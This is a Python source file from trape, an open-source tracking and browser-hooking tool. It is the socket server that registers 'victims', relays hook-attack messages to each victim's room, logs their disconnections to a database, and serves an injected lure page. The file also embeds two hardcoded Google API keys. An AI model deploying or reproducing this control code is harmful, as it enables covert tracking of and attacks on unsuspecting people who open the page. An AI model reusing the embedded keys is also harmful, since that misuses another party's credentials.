#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
#**
from socket import gethostname, gethostbyname 
from threading import Lock
from flask import Flask, render_template, session, request, json
from flask_socketio import SocketIO, emit, join_room, rooms, disconnect
import core.stats 
import core.user
from core.user_objects import attacks_hook_message
from core.utils import utils
from core.db import Database
import sys

# Main parts, to generate relationships among others
trape = core.stats.trape
app = core.stats.app

# call database
db = Database()

async_mode = None
socketio = SocketIO(app, async_mode=async_mode)
thread = None
thread_lock = Lock()

db.sentences_victim('clean_online', None, 2)

def background_thread():
    count = 0

@socketio.on("join", namespace="/trape")
def join(message):
    try:
        join_room(message['room'])
        session['receive_count'] = session.get('receive_count', 0) + 1
    except Exception as error:
        pass

@socketio.on("my_room_event", namespace="/trape")
def send_room_message(message):
    try:
        session['receive_count'] = session.get('receive_count', 0) + 1
        hookAction = attacks_hook_message(message['data']['type'])
        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "@" + utils.Color['white'] + "]" + " " + hookAction + utils.Color['blue'] + message['data']['message'] + utils.Color['white'] + ' in '  + utils.Color['green'] + message['room'] + utils.Color['white'])
        emit('my_response', {'data': message['data'], 'count': session['receive_count']},room = message['room'])
    except Exception as error:
        pass

@socketio.on("disconnect_request", namespace="/trape")
def disconnect_request(d):
    try:
        session['receive_count'] = session.get('receive_count', 0) + 1
        emit('my_response', {'data': 'Disconnected!', 'count': session['receive_count']})
        utils.Go(utils.Color['white'] + "[" + utils.Color['redBold'] + "-" + utils.Color['white'] + "]" + utils.Color['red'] + " " + "A victim has closed her connection with the following id:" + " " + utils.Color['green'] + d['vId'] + utils.Color['white'])
        db.sentences_victim('disconnect_victim', d['vId'], 2)
    except Exception as error:
        pass

@socketio.on("error", namespace="/trape")
def socket_def_error(d):
    pass

@socketio.on_error("/trape")
def error_handler(e):
    pass

@app.route("/" + trape.home_path)
def home():
    gMaps_free_api_key = 'AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM'
    if (trape.gmaps != ''):
        gMaps_free_api_key = trape.gmaps

    shorten_api = 'AIzaSyCPzcppCT27KTHnxAIQvYhtvB_l8sKGYBs'

    html = trape.injectCSS_Paths(render_template("home.html", async_mode=socketio.async_mode).replace('[OWN_API_KEY_HERE]', gMaps_free_api_key).replace('[LIBS_SRC]', trape.JSFiles[1]['src']).replace('[TRAPE_SRC]', trape.JSFiles[4]['src']))
    return html

if __name__ == 'core.sockets':
    try:
        socketio.run(app, host= '0.0.0.0', port=trape.app_port, debug=False)
    except KeyboardInterrupt:
        socketio.stop()
        trape.validateLicense.terminate()
        sys.exit(0)